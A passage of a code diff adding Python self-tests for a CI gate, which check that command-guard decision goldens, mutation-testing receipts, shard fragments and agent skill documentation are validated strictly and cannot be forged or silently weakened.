+    expect(
+        "the registered harness timeout returns a failed child result",
+        byte_timeout_result.returncode == 1,
+    )
+    expect(
+        "the registered harness timeout cannot forge child stdout",
+        byte_timeout_result.stdout == "",
+    )
+    expect(
+        "the registered harness timeout reports its exceptional deadline",
+        "child exceeded 240s" in byte_timeout_result.stderr,
+    )
+    expect(
+        "invalid timeout stderr bytes are retained with replacement decoding",
+        "\ufffdpartial bytes" in byte_timeout_result.stderr,
+    )
+    expect(
+        "receipt validation rejects the registered harness timeout",
+        harness_spec is not None
+        and validate_receipt(byte_timeout_result, harness_spec) is not None,
+    )
+    expect("recorded guard decisions match the guards", decision_golden_error() == "")
+    decision_contract = {
+        "schema_version": 1,
+        "generated_by": "probe-writer",
+        "note": "probe-note",
+        "corpus": "probe-corpus",
+        "top_level_keys": (
+            "schema_version", "generated_by", "note", "corpus", "exclusions",
+            "decisions",
+        ),
+        "exclusion_keys": (
+            "max_command_chars", "oversized", "computed_at_import",
+        ),
+    }
+    decision_snapshot = {
+        "commands": ("git status --short",),
+        "exclusions": {
+            "max_command_chars": 2000,
+            "oversized": [],
+            "computed_at_import": [],
+        },
+    }
+    decision_probe = {
+        "schema_version": 1,
+        "generated_by": "probe-writer",
+        "note": "probe-note",
+        "corpus": "probe-corpus",
+        "exclusions": decision_snapshot["exclusions"],
+        "decisions": {"git status --short": "allow"},
+    }
+    decision_args = {
+        "snapshot": decision_snapshot,
+        "contract": decision_contract,
+        "decide": lambda _command: ("allow", ""),
+    }
+    expect(
+        "an exact synthetic decision golden clears",
+        decision_golden_error(golden_data=decision_probe, **decision_args) == "",
+    )
+    expect(
+        "a matching nonempty decision corpus below its independent floor fails",
+        decision_golden_error(
+            golden_data=decision_probe, minimum_commands=2, **decision_args) != "",
+    )
+    expect(
+        "an empty decision golden is a failure, not a clean verdict",
+        decision_golden_error(
+            golden_data=dict(decision_probe, decisions={}), **decision_args) != "",
+    )
+    expect(
+        "a reversed verdict in the golden is reported with both sides",
+        "deny -> allow" in decision_golden_error(
+            golden_data=dict(
+                decision_probe, decisions={"git status --short": "deny"}),
+            **decision_args),
+    )
+    for field in decision_contract["top_level_keys"]:
+        without = {key: value for key, value in decision_probe.items() if key != field}
+        expect(
+            f"decision golden rejects a missing {field} field",
+            decision_golden_error(golden_data=without, **decision_args) != "",
+        )
+    expect(
+        "decision golden rejects an unexpected top-level field",
+        decision_golden_error(
+            golden_data=dict(decision_probe, invented=True), **decision_args) != "",
+    )
+    expect(
+        "decision golden rejects a command missing from the recorded corpus",
+        decision_golden_error(
+            golden_data=dict(decision_probe, decisions={}), **decision_args) != "",
+    )
+    expect(
+        "decision golden rejects a command foreign to the generated corpus",
+        decision_golden_error(
+            golden_data=dict(decision_probe, decisions={
+                "git status --short": "allow", "git invented": "allow"}),
+            **decision_args) != "",
+    )
+    expect(
+        "decision golden rejects a non-outcome verdict",
+        decision_golden_error(
+            golden_data=dict(
+                decision_probe, decisions={"git status --short": "maybe"}),
+            **decision_args) != "",
+    )
+    expect(
+        "decision golden rejects altered exclusion metadata",
+        decision_golden_error(
+            golden_data=dict(decision_probe, exclusions=dict(
+                decision_snapshot["exclusions"], max_command_chars=1999)),
+            **decision_args) != "",
+    )
+    with tempfile.TemporaryDirectory(prefix="z-harness-json-keys-") as raw:
+        duplicate_json = Path(raw) / "duplicate.json"
+        duplicate_json.write_text('{"decisions": {}, "decisions": {}}\n',
+                                  encoding="utf-8")
+        try:
+            _json_without_duplicate_keys(duplicate_json)
+            duplicate_rejected = False
+        except ValueError:
+            duplicate_rejected = True
+        expect("duplicate JSON object keys are rejected", duplicate_rejected)
+    expect(
+        "hook budget contract rejects a sub-second margin",
+        hook_budget_error(budget=4.01) != "",
+    )
+
+    set_mutation = {
+        "version": 1, "kind": "set-element", "module": "guard-a.py",
+        "name": "TOKENS", "collection_kind": "set", "element": "x",
+        "allowed_statuses": [], "id": "set-id",
+    }
+    site_mutation = {
+        "version": 1, "kind": "site", "module": "guard-b.py", "label": "site probe",
+        "anchor_sha256": "a" * 64, "replacement_sha256": "b" * 64,
+        "selectors": ["probe selector"], "allowed_statuses": [], "id": "site-id",
+    }
+    addition_mutation = {
+        "version": 1, "kind": "set-addition", "module": "guard-a.py",
+        "name": "TOKENS", "collection_kind": "set", "element": "z",
+        "label": "probe addition", "allowed_statuses": [], "id": "add-id",
+    }
+    mutation_plan_probe = [set_mutation, site_mutation, addition_mutation]
+    mutation_contract = {
+        "schema_version": 3,
+        "generated_by": "tools/write-mutation-receipt.py --aggregate",
+        "note": "probe-note", "generator_sha256": "c" * 64,
+        "plan_sha256": "d" * 64,
+        "keys": (
+            "schema_version", "generated_by", "note", "generator_sha256",
+            "source_digests", "plan_sha256", "baseline", "sweep_exclusions",
+            "results", "survivors", "unasserted_kills", "caught", "total",
+        ),
+        "guards": ("guard-a.py", "guard-b.py", "guard-c.py"),
+        "kill_reasons": frozenset({
+            "suite-failure", "exact-check-count", "survived", "timeout",
+            "selector-failure",
+        }),
+        "unasserted_reason": "exact-check-count",
+        "unasserted_ceiling": 1,
+    }
+    mutation_sources = {name: str(index) * 64 for index, name in enumerate(
+        mutation_contract["guards"], 1)}
+    set_result = {key: value for key, value in set_mutation.items()
+                  if key != "allowed_statuses"}
+    set_result["outcome"] = "survived"
+    set_result["reason"] = "survived"
+    site_result = {key: value for key, value in site_mutation.items()
+                   if key != "allowed_statuses"}
+    site_result["outcome"] = "caught"
+    site_result["reason"] = "selector-failure"
+    addition_result = {key: value for key, value in addition_mutation.items()
+                       if key != "allowed_statuses"}
+    addition_result["outcome"] = "caught"
+    addition_result["reason"] = "suite-failure"
+    mutation_probe = {
+        "schema_version": 3,
+        "generated_by": mutation_contract["generated_by"],
+        "note": "probe-note",
+        "generator_sha256": "c" * 64,
+        "source_digests": mutation_sources,
+        "plan_sha256": "d" * 64,
+        "baseline": {name: "passed" for name in mutation_contract["guards"]},
+        "sweep_exclusions": {"guard-a.py::FIXTURES": "fixture corpus"},
+        "results": {"set-id": set_result, "site-id": site_result,
+                    "add-id": addition_result},
+        "survivors": ["set-id"], "unasserted_kills": [], "caught": 2, "total": 3,
+    }
+    mutation_args = {
+        "plan": mutation_plan_probe,
+        "exclusions": mutation_probe["sweep_exclusions"],
+        "contract": mutation_contract,
+        "current_sources": mutation_sources,
+        "ceiling": 1,
+        "unasserted_ceiling": 1,
+        "unasserted_identities": set(),
+        "policy": {
+            "collections": {("guard-a.py", "TOKENS"): 1},
+            "sites": {("guard-b.py", "site probe")},
+            "selectors": {("guard-b.py", "site probe"): ("probe selector",)},
+            "site_digest": mutation_site_policy_digest([site_mutation]),
+            "exclusions": mutation_probe["sweep_exclusions"],
+            "additions": {
+                ("guard-a.py", "TOKENS", "set", "z", "probe addition", ()),
+            },
+            "floor": 3,
+        },
+    }
+    writer_spec = importlib.util.spec_from_file_location(
+        "_ci_gate_mutation_writer_selftest",
+        ROOT / "tools/write-mutation-receipt.py")
+    assert writer_spec is not None and writer_spec.loader is not None
+    writer = importlib.util.module_from_spec(writer_spec)
+    writer_spec.loader.exec_module(writer)
+    original_writer_which = writer.shutil.which
+    writer.shutil.which = (
+        lambda name: None if name == "zsh" else original_writer_which(name))
+    try:
+        try:
+            writer.baseline_results(ROOT)
+            missing_zsh_rejected = False
+        except ValueError as exc:
+            missing_zsh_rejected = "zsh is required" in str(exc)
+    finally:
+        writer.shutil.which = original_writer_which
+    expect(
+        "mutation baselines reject a host that skipped the zsh runtime probes",
+        missing_zsh_rejected,
+    )
+    raw_baseline = {
+        relative: {
+            "status": "completed", "returncode": 0,
+            "checks": 10, "failures": 0,
+        }
+        for relative in writer.GUARDS
+    }
+    raw_descriptor = {
+        "id": "raw-probe", "kind": "set-element", "module": writer.GREP,
+        "allowed_statuses": [],
+    }
+    raw_survivor = {
+        "owner": raw_baseline[writer.GREP],
+        "merged": raw_baseline[writer.BASH],
+        "outcome": "survived", "reason": "survived",
+    }
+    expect(
+        "fragment aggregation independently recomputes a truthful raw outcome",
+        writer.recompute_raw_result(
+            raw_survivor, raw_descriptor, raw_baseline) == ("survived", "survived"),
+    )
+    try:
+        writer.recompute_raw_result(
+            dict(raw_survivor, outcome="caught", reason="suite-failure"),
+            raw_descriptor, raw_baseline)
+        forged_raw_rejected = False
+    except ValueError:
+        forged_raw_rejected = True
+    expect(
+        "fragment aggregation rejects a forged self-reported outcome",
+        forged_raw_rejected,
+    )
+    malformed_owner = dict(raw_baseline[writer.GREP], invented=True)
+    try:
+        writer.recompute_raw_result(
+            dict(raw_survivor, owner=malformed_owner), raw_descriptor, raw_baseline)
+        malformed_raw_rejected = False
+    except ValueError:
+        malformed_raw_rejected = True
+    expect(
+        "fragment aggregation rejects an extra raw suite field",
+        malformed_raw_rejected,
+    )
+    invalid_receipt = {
+        "status": "invalid-receipt", "returncode": 1,
+        "receipt_count": 0, "stderr_tail": "mutated receipt",
+    }
+    try:
+        writer.recompute_raw_result(
+            {
+                "owner": invalid_receipt, "merged": None,
+                "outcome": "caught", "reason": "invalid-receipt",
+            },
+            raw_descriptor, raw_baseline,
+        )
+        invalid_owner_rejected = False
+    except ValueError:
+        invalid_owner_rejected = True
+    expect(
+        "fragment aggregation rejects an invalid terminal receipt",
+        invalid_owner_rejected,
+    )
+    original_apply_mutation = writer.apply_mutation
+    original_run_suite = writer.run_suite
+    with tempfile.TemporaryDirectory(prefix="z-harness-merged-kill-") as raw:
+        target = Path(raw) / "guard.py"
+        target.write_text("pristine\n", encoding="utf-8")
+        writer.apply_mutation = lambda _tree, _descriptor: (target, "pristine\n")
+        writer.run_suite = lambda _tree, relative, **_kwargs: (
+            raw_baseline[writer.GREP] if relative == writer.GREP else invalid_receipt)
+        try:
+            try:
+                propagated_kill = writer.execute_mutation(
+                    Path(raw), raw_descriptor, raw_baseline)
+            except ValueError:
+                propagated_kill = None
+        finally:
+            writer.apply_mutation = original_apply_mutation
+            writer.run_suite = original_run_suite
+        expect(
+            "an invalid merged-suite receipt aborts mutation scoring",
+            propagated_kill is None,
+        )
+    try:
+        writer.recompute_raw_result(
+            {
+                "owner": raw_baseline[writer.GREP],
+                "merged": invalid_receipt,
+                "outcome": "caught", "reason": "invalid-receipt",
+            },
+            raw_descriptor, raw_baseline,
+        )
+        invalid_merged_rejected = False
+    except ValueError:
+        invalid_merged_rejected = True
+    expect(
+        "aggregation rejects an invalid merged-suite receipt",
+        invalid_merged_rejected,
+    )
+    context_fragment = {"head_sha": "head-a", "baseline": raw_baseline}
+    expect(
+        "aggregate context accepts the exact head and fresh baseline",
+        writer.aggregate_context_error(
+            context_fragment, "head-a", raw_baseline) == "",
+    )
+    expect(
+        "aggregate context rejects a foreign fragment head",
+        writer.aggregate_context_error(
+            context_fragment, "head-b", raw_baseline) != "",
+    )
+    changed_baseline = dict(raw_baseline)
+    changed_baseline[writer.GREP] = dict(
+        raw_baseline[writer.GREP], checks=9)
+    expect(
+        "aggregate context rejects a shard-only baseline",
+        writer.aggregate_context_error(
+            context_fragment, "head-a", changed_baseline) != "",
+    )
+    assignment_plan = [{"id": name} for name in ("a", "b", "c")]
+    assignment_fragment = {
+        "shard": {"index": 0, "count": 2},
+        "results": {"a": {}, "c": {}},
+    }
+    expect(
+        "a deterministic shard assignment clears",
+        writer.shard_assignment_error(
+            assignment_fragment, assignment_plan, 2) == "",
+    )
+    expect(
+        "a same-union fragment with the wrong shard assignment fails",
+        writer.shard_assignment_error(
+            dict(assignment_fragment, results={"a": {}}),
+            assignment_plan, 2) != "",
+    )
+    with tempfile.TemporaryDirectory(prefix="z-harness-fragment-json-") as raw:
+        duplicate_fragment = Path(raw) / "fragment.json"
+        duplicate_fragment.write_text(
+            '{"results": {}, "results": {}}\n', encoding="utf-8")
+        try:
+            writer.load_json(duplicate_fragment)
+            duplicate_fragment_rejected = False
+        except ValueError:
+            duplicate_fragment_rejected = True
+        expect(
+            "fragment JSON rejects duplicate object keys",
+            duplicate_fragment_rejected,
+        )
+    # The receipt is compared across hosts, and whether an assertion fires can differ by
+    # environment, so the comparison runs on a projection that drops the observed reason and
+    # its tally. That projection must stay blind to exactly those two fields and to nothing
+    # else, or a real regression rides through the same hole.
+    import copy as _copy
+    stable_probe = {
+        "schema_version": writer.SCHEMA_VERSION, "generated_by": "x", "note": "n",
+        "generator_sha256": "c" * 64, "source_digests": {}, "plan_sha256": "d" * 64,
+        "baseline": {}, "sweep_exclusions": {},
+        "results": {
+            "a": {"outcome": "caught", "reason": "suite-failure", "kind": "set-element",
+                  "module": "guard-a.py", "name": "T", "element": "x"},
+            "b": {"outcome": "survived", "reason": "survived", "kind": "set-element",
+                  "module": "guard-a.py", "name": "T", "element": "y"}},
+        "survivors": ["b"], "unasserted_kills": [], "caught": 1, "total": 2,
+    }
+    stable_plan = [
+        {"id": "a", "kind": "set-element", "module": "guard-a.py",
+         "name": "T", "element": "x", "allowed_statuses": []},
+        {"id": "b", "kind": "set-element", "module": "guard-a.py",
+         "name": "T", "element": "y", "allowed_statuses": []},
+    ]
+    # The receipt and its summary are compared byte for byte against a CI re-measurement, so
+    # neither may depend on a value only one host can observe. These pin the RULE rather than
+    # the two fields that broke it: every declared host-observed field must be invisible to
+    # both comparisons, and nothing else may be.
+    expect(
+        "the host-observed field sets are declared and non-empty",
+        bool(writer.HOST_OBSERVED_RESULT_FIELDS) and bool(writer.HOST_OBSERVED_RECEIPT_KEYS),
+    )
+    observed_invisible = True
+    for _key in writer.HOST_OBSERVED_RECEIPT_KEYS:
+        _probe = _copy.deepcopy(stable_probe)
+        _probe[_key] = ["a"] if _probe.get(_key) == [] else []
+        observed_invisible &= (
+            writer.platform_stable(stable_probe) == writer.platform_stable(_probe)
+            and writer.summary_text(stable_probe) == writer.summary_text(_probe))
+    for _field in writer.HOST_OBSERVED_RESULT_FIELDS:
+        _probe = _copy.deepcopy(stable_probe)
+        _probe["results"]["a"][_field] = "exact-check-count"
+        observed_invisible &= (
+            writer.platform_stable(stable_probe) == writer.platform_stable(_probe)
+            and writer.summary_text(stable_probe) == writer.summary_text(_probe))
+    expect(
+        "every declared host-observed field is invisible to both cross-host comparisons",
+        observed_invisible,
+    )
+    _under_ceiling = _copy.deepcopy(stable_probe)
+    _under_ceiling["results"]["a"]["reason"] = writer.UNASSERTED_KILL_REASON
+    _under_ceiling["unasserted_kills"] = ["a"]
+    _over_ceiling = _copy.deepcopy(_under_ceiling)
+    _over_ceiling["results"]["b"]["outcome"] = "caught"
+    _over_ceiling["results"]["b"]["reason"] = writer.UNASSERTED_KILL_REASON
+    _over_ceiling["survivors"] = []
+    _over_ceiling["unasserted_kills"] = ["a", "b"]
+    _over_ceiling["caught"] = 2
+    expect(
+        "fresh host-observed kills are derived and bounded before projection",
+        writer.fresh_observation_error(_under_ceiling, stable_plan) == ""
+        and writer.fresh_observation_error(_over_ceiling, stable_plan) != "",
+    )
+    _saved_receipt = writer.RECEIPT
+    _saved_summary = writer.SUMMARY
+    _saved_normalized_receipt = writer.normalized_receipt
+    _saved_mutation_plan = writer.mutation_plan
+    with tempfile.TemporaryDirectory(prefix="z-harness-fresh-observation-") as raw:
+        writer.RECEIPT = Path(raw) / "receipt.json"
+        writer.SUMMARY = Path(raw) / "summary.md"
+        writer.RECEIPT.write_text(
+            json.dumps(_over_ceiling, indent=1) + "\n", encoding="utf-8")
+        writer.SUMMARY.write_text(
+            writer.summary_text(_over_ceiling), encoding="utf-8")
+        writer.normalized_receipt = lambda _fragments: _over_ceiling
+        writer.mutation_plan = lambda: (stable_plan, {})
+        try:
+            _fresh_aggregate_rc = writer.aggregate([], False)
+        finally:
+            writer.RECEIPT = _saved_receipt
+            writer.SUMMARY = _saved_summary
+            writer.normalized_receipt = _saved_normalized_receipt
+            writer.mutation_plan = _saved_mutation_plan
+    expect(
+        "fresh aggregation enforces the kill ceiling before a stable projection can pass",
+        _fresh_aggregate_rc == 2,
+    )
+    # The dual: the projection must not quietly stop comparing something real. Any field it
+    # drops beyond the declared set would be a regression nobody could see.
+    _projected = writer.platform_stable(stable_probe)
+    expect(
+        "the projection drops the declared host-observed keys and nothing else",
+        set(stable_probe) - set(_projected) == set(writer.HOST_OBSERVED_RECEIPT_KEYS)
+        and all(set(stable_probe["results"][k]) - set(_projected["results"][k])
+                == set(writer.HOST_OBSERVED_RESULT_FIELDS) for k in _projected["results"]),
+    )
+    _real_changes = []
+    _flip = _copy.deepcopy(stable_probe); _flip["results"]["a"]["outcome"] = "survived"
+    _real_changes.append(("a flipped outcome", _flip))
+    _drop = _copy.deepcopy(stable_probe); _drop["results"].pop("a")
+    _real_changes.append(("a dropped result", _drop))
+    _surv = _copy.deepcopy(stable_probe); _surv["survivors"] = []
+    _real_changes.append(("a shortened survivor list", _surv))
+    _elem = _copy.deepcopy(stable_probe); _elem["results"]["a"]["element"] = "z"
+    _real_changes.append(("a changed mutation element", _elem))
+    for _label, _changed in _real_changes:
+        expect(
+            f"the cross-host comparison still sees {_label}",
+            writer.platform_stable(stable_probe) != writer.platform_stable(_changed),
+        )
+    # The helper below controls the CLI-removal checks, so prove both arms first.
+    expect(
+        "the raise helper reports a call that does not raise",
+        _raises(lambda: None, ValueError) is False,
+    )
+    expect(
+        "the raise helper does not accept the wrong exception type",
+        _raises(lambda: (_ for _ in ()).throw(KeyError("x")), ValueError) is False,
+    )
+    expect(
+        "the raise helper reports a call that raises the named type",
+        _raises(lambda: (_ for _ in ()).throw(ValueError("x")), ValueError) is True,
+    )
+    expect(
+        "the removed resweep selector is rejected by the public CLI",
+        _raises(lambda: writer.parse_args(["--resweep-needed", "base"]), SystemExit),
+    )
+    expect(
+        "the removed inheritance mode is rejected by the public CLI",
+        _raises(lambda: writer.parse_args(["--verify-inherited", "base"]), SystemExit),
+    )
+    expect("recorded mutation evidence matches the guards", mutation_receipt_error() == "")
+    expect(
+        "an exact synthetic mutation receipt clears",
+        mutation_receipt_error(mutation_probe, **mutation_args) == "",
+    )
+    # A kill scored only by a moved check count inflates `caught` without any assertion
+    # having failed. The receipt records those separately so the distinction survives into
+    # the artifact; these probe that the tally is derived, bounded, and cannot be forged.
+    unasserted_addition = dict(addition_result, reason="exact-check-count")
+    unasserted_probe = dict(
+        mutation_probe,
+        results={"set-id": set_result, "site-id": site_result,
+                 "add-id": unasserted_addition},
+        unasserted_kills=["add-id"],
+    )
+    expect(
+        "a kill scored only by a moved check count is recorded as unasserted",
+        mutation_receipt_error(
+            unasserted_probe,
+            **dict(mutation_args,
+                   unasserted_identities={("guard-a.py", "TOKENS", "z")})) == "",
+    )
+    expect(
+        "an unasserted kill outside the reviewed set fails",
+        mutation_receipt_error(unasserted_probe, **mutation_args) != "",
+    )
+    expect(
+        "an unasserted kill omitted from the tally fails",
+        mutation_receipt_error(
+            dict(unasserted_probe, unasserted_kills=[]), **mutation_args) != "",
+    )
+    expect(
+        "an unasserted tally naming a mutation that asserted fails",
+        mutation_receipt_error(
+            dict(mutation_probe, unasserted_kills=["site-id"]), **mutation_args) != "",
+    )
+    expect(
+        "unasserted kills above the reviewed ceiling fail",
+        mutation_receipt_error(
+            unasserted_probe, **dict(mutation_args, unasserted_ceiling=0)) != "",
+    )
+    expect(
+        "a result carrying a reason outside the generator vocabulary fails",
+        mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": set_result, "add-id": addition_result,
+                          "site-id": dict(site_result, reason="looks-fine")}),
+            **mutation_args) != "",
+    )
+    impossible_selector_reason = dict(set_result, outcome="caught",
+                                      reason="selector-failure")
+    impossible_selector_probe = dict(
+        mutation_probe,
+        results={"set-id": impossible_selector_reason,
+                 "add-id": addition_result, "site-id": site_result},
+        survivors=[], caught=3,
+    )
+    expect(
+        "a selectorless mutation cannot claim a selector-failure kill",
+        "unreachable" in mutation_receipt_error(
+            impossible_selector_probe, **mutation_args),
+    )
+    impossible_suite_reason = dict(site_result, reason="suite-failure")
+    expect(
+        "a selected mutation cannot claim a whole-suite kill",
+        "unreachable" in mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": set_result, "add-id": addition_result,
+                          "site-id": impossible_suite_reason}),
+            **mutation_args),
+    )
+    expect(
+        "a caught result claiming the survived reason fails",
+        mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": set_result, "add-id": addition_result,
+                          "site-id": dict(site_result, reason="survived")}),
+            **mutation_args) != "",
+    )
+    expect(
+        "a survived result claiming a kill reason fails",
+        mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": dict(set_result, reason="suite-failure"),
+                          "add-id": addition_result, "site-id": site_result}),
+            **mutation_args) != "",
+    )
+    expect(
+        "a crash status the plan never allowed fails",
+        mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": set_result, "add-id": addition_result,
+                          "site-id": dict(site_result, reason="timeout")}),
+            **mutation_args) != "",
+    )
+    expect(
+        "a result missing its reason entirely fails",
+        mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": set_result, "add-id": addition_result,
+                          "site-id": {k: v for k, v in site_result.items()
+                                      if k != "reason"}}),
+            **mutation_args) != "",
+    )
+    # result_kill can return any status the plan tolerates, so a new allowed_statuses entry
+    # that nobody added to the vocabulary would make every result carrying it unvalidatable.
+    planned_statuses = set()
+    for _descriptor in writer.mutation_plan()[0]:
+        planned_statuses.update(_descriptor.get("allowed_statuses", ()) or ())
+    expect(
+        "every status the plan tolerates is a reason the gate can validate",
+        planned_statuses <= set(writer.KILL_REASONS),
+    )
+    expect(
+        "the unasserted reason is one the generator can actually emit",
+        writer.UNASSERTED_KILL_REASON in writer.KILL_REASONS,
+    )
+    shrunk_contract = dict(mutation_contract, plan_sha256="e" * 64)
+    shrunk_probe = dict(
+        mutation_probe,
+        plan_sha256="e" * 64,
+        results={"set-id": set_result},
+        survivors=["set-id"], caught=0, total=1,
+    )
+    expect(
+        "a self-consistently regenerated but shrunken plan remains a failure",
+        mutation_receipt_error(
+            shrunk_probe,
+            **dict(mutation_args, plan=[set_mutation], contract=shrunk_contract),
+        ) != "",
+    )
+    expect(
+        "a foreign site identity fails the independent closed inventory",
+        mutation_policy_error(
+            [set_mutation, dict(site_mutation, label="foreign")],
+            mutation_probe["sweep_exclusions"], mutation_args["policy"],
+        ) != "",
+    )
+    expect(
+        "a duplicate site identity fails the independent closed inventory",
+        mutation_policy_error(
+            [set_mutation, site_mutation, dict(site_mutation, id="duplicate-site")],
+            mutation_probe["sweep_exclusions"], mutation_args["policy"],
+        ) != "",
+    )
+    expect(
+        "changing a site anchor fails the independent semantic digest",
+        mutation_policy_error(
+            [set_mutation, dict(
+                site_mutation, anchor_sha256="c" * 64, id="changed-site")],
+            mutation_probe["sweep_exclusions"], mutation_args["policy"],
+        ) != "",
+    )
+    expect(
+        "changing a site selector fails the independent closed inventory",
+        mutation_policy_error(
+            [set_mutation, dict(
+                site_mutation, selectors=["different selector"], id="changed-selector")],
+            mutation_probe["sweep_exclusions"], mutation_args["policy"],
+        ) != "",
+    )
+    expect(
+        "changing a declared addition's allowed kill modes fails closed",
+        mutation_policy_error(
+            [set_mutation, site_mutation,
+             dict(addition_mutation, allowed_statuses=["timeout"])],
+            mutation_probe["sweep_exclusions"], mutation_args["policy"],
+        ) != "",
+    )
+    expect(
+        "set-element mutations cannot declare invalid receipts as kills",
+        mutation_policy_error(
+            [dict(set_mutation, allowed_statuses=["invalid-receipt"]),
+             site_mutation, addition_mutation],
+            mutation_probe["sweep_exclusions"], mutation_args["policy"],
+        ) != "",
+    )
+    duplicate_target = dict(
+        site_mutation, label="site twin", id="duplicate-target")
+    duplicate_target_policy = dict(
+        mutation_args["policy"],
+        sites={("guard-b.py", "site probe"), ("guard-b.py", "site twin")},
+        selectors={
+            ("guard-b.py", "site probe"): ("probe selector",),
+            ("guard-b.py", "site twin"): ("probe selector",),
+        },
+        site_digest=mutation_site_policy_digest(
+            [site_mutation, duplicate_target]),
+        floor=3,
+    )
+    expect(
+        "two labels cannot execute the same semantic site mutation",
+        mutation_policy_error(
+            [set_mutation, site_mutation, duplicate_target],
+            mutation_probe["sweep_exclusions"], duplicate_target_policy,
+        ) != "",
+    )
+    for field in mutation_contract["keys"]:
+        expect(
+            f"mutation receipt rejects a missing {field} field",
+            mutation_receipt_error(
+                {key: value for key, value in mutation_probe.items() if key != field},
+                **mutation_args) != "",
+        )
+    expect(
+        "mutation receipt rejects an unexpected top-level field",
+        mutation_receipt_error(dict(mutation_probe, invented=True), **mutation_args) != "",
+    )
+    expect(
+        "mutation receipt rejects a missing planned result",
+        mutation_receipt_error(
+            dict(mutation_probe, results={"site-id": site_result}), **mutation_args) != "",
+    )
+    expect(
+        "mutation receipt rejects a foreign result",
+        mutation_receipt_error(
+            dict(mutation_probe, results=dict(mutation_probe["results"], foreign={})),
+            **mutation_args) != "",
+    )
+    expect(
+        "mutation receipt rejects an extra nested evidence field",
+        mutation_receipt_error(
+            dict(mutation_probe, results=dict(
+                mutation_probe["results"],
+                **{"set-id": dict(set_result, failures=999)})),
+            **mutation_args) != "",
+    )
+    expect(
+        "mutation receipt recomputes survivors instead of trusting the list",
+        mutation_receipt_error(dict(mutation_probe, survivors=[]), **mutation_args) != "",
+    )
+    expect(
+        "mutation receipt recomputes caught and total",
+        mutation_receipt_error(
+            dict(mutation_probe, caught=999, total=999), **mutation_args) != "",
+    )
+    site_survived = dict(site_result, outcome="survived", reason="survived")
+    caught_set = dict(set_result, outcome="caught", reason="suite-failure")
+    expect(
+        "a surviving site mutation is always a failure",
+        mutation_receipt_error(
+            dict(mutation_probe,
+                 results={"set-id": caught_set, "site-id": site_survived,
+                          "add-id": addition_result},
+                 survivors=["site-id"], caught=2),
+            **mutation_args) != "",
+    )
+    compensated_addition = dict(
+        addition_result, outcome="survived", reason="survived")
+    compensated_set = dict(set_result, outcome="caught", reason="suite-failure")
+    expect(
+        "a declared addition survivor fails even when ordinary debt falls by one",
+        mutation_receipt_error(
+            dict(
+                mutation_probe,
+                results={"set-id": compensated_set, "site-id": site_result,
+                         "add-id": compensated_addition},
+                survivors=["add-id"], caught=2,
+            ),
+            **mutation_args,
+        ) != "",
+    )
+    expect(
+        "survivor debt above the closed ceiling is a failure",
+        mutation_receipt_error(mutation_probe, **dict(mutation_args, ceiling=0)) != "",
+    )
+    recorded_receipt = _json_without_duplicate_keys(MUTATION_RECEIPT)
+    expect(
+        "the tracked survivor debt exactly fills the reviewed ceiling",
+        (len(recorded_receipt["survivors"])
+         == MUTATION_SURVIVOR_DEBT_CEILING),
+    )
+    regressed_receipt = json.loads(json.dumps(recorded_receipt))
+    regression_id = next(
+        mutation_id for mutation_id, result in regressed_receipt["results"].items()
+        if result["kind"] == "set-element" and result["outcome"] == "caught")
+    regressed_receipt["results"][regression_id]["outcome"] = "survived"
+    regressed_receipt["survivors"] = sorted(
+        mutation_id for mutation_id, result in regressed_receipt["results"].items()
+        if result["outcome"] == "survived")
+    regressed_receipt["caught"] -= 1
+    expect(
+        "one additional set-element survivor exceeds the production ceiling",
+        mutation_receipt_error(regressed_receipt) != "",
+    )
+    expect(
+        "a receipt missing the Bash baseline is not evidence over all guards",
+        mutation_receipt_error(
+            dict(mutation_probe, baseline={
+                "guard-a.py": "passed", "guard-b.py": "passed"}),
+            **mutation_args) != "",
+    )
+    expect(
+        "a stale guard digest invalidates the mutation receipt",
+        mutation_receipt_error(
+            dict(mutation_probe, source_digests={
+                **mutation_sources, "guard-a.py": "0" * 64}),
+            **mutation_args) != "",
+    )
+    expect(
+        "the canonical mutation summary is derived from the strict receipt",
+        mutation_summary_error() == "",
+    )
+    forged_summary = MUTATION_SUMMARY.read_bytes() + b"\nforged summary bytes\n"
+    expect(
+        "changing the summary and its outbound copies cannot bypass receipt derivation",
+        mutation_summary_error(
+            receipt_data=recorded_receipt, summary_bytes=forged_summary) != "",
+    )
+    handoff_sources = {
+        relative: (ROOT / relative).read_text(encoding="utf-8")
+        for relative in HANDOFF_DOCTRINE
+    }
+    expect(
+        "the handoff doctrine has the complete reviewed membership",
+        tuple(HANDOFF_DOCTRINE) == (
+            "AGENTS.md",
+            "skills/outbound-drafts/SKILL.md",
+            "skills/pr-review-method/SKILL.md",
+            "skills/pr-review-method/references/deferred.md",
+            "contracts/review/README.md",
+        )
+        and tuple(len(HANDOFF_DOCTRINE[key]) for key in HANDOFF_DOCTRINE)
+        == (3, 4, 2, 1, 5),
+    )
+    expect(
+        "every skill's own eval corpus meets its floor",
+        eval_corpus_distribution_error() == "",
+    )
+    expect(
+        "a skill whose eval corpus is emptied fails even when the total is restored",
+        eval_corpus_distribution_error(
+            counts=dict({k: v for k, v in EVAL_SCENARIO_FLOORS.items()},
+                        **{"outbound-drafts": 0, "craft-prompt": 6})) != "",
+    )
+    dispatch_body = (ROOT / DISPATCH_BODY_DOCUMENT).read_text(encoding="utf-8")
+    # The scan target is part of the claim. Deriving the fixture from the constant let the
+    # check be aimed at any clean file with the suite still green.
+    expect(
+        "the dispatch-body scan targets the skill body an agent loads first",
+        DISPATCH_BODY_DOCUMENT == "skills/agent-dispatch/SKILL.md"
+        and (ROOT / DISPATCH_BODY_DOCUMENT).is_file(),
+    )
+    expect(
+        "the dispatch body asserts no retired external-tool channel",
+        retired_dispatch_claim_error(body_text=dispatch_body) == "",
+    )
+    # Every retired spelling, not just the first.
+    for spelling in RETIRED_DISPATCH_CLAIMS:
+        expect(
+            f"restoring the retired claim {spelling!r} turns the dispatch check red",
+            "retired external-tool channel" in retired_dispatch_claim_error(
+                body_text=dispatch_body + f"\nThe {spelling} works.\n"),
+        )
+    expect(
+        "the retired-claim scan is case-insensitive",
+        "retired external-tool channel" in retired_dispatch_claim_error(
+            body_text="The Append-To-Subagent-System-Prompt flag works."),
+    )
+    # A phrase containing spaces, so a reflow across lines is what the case actually tests.
+    expect(
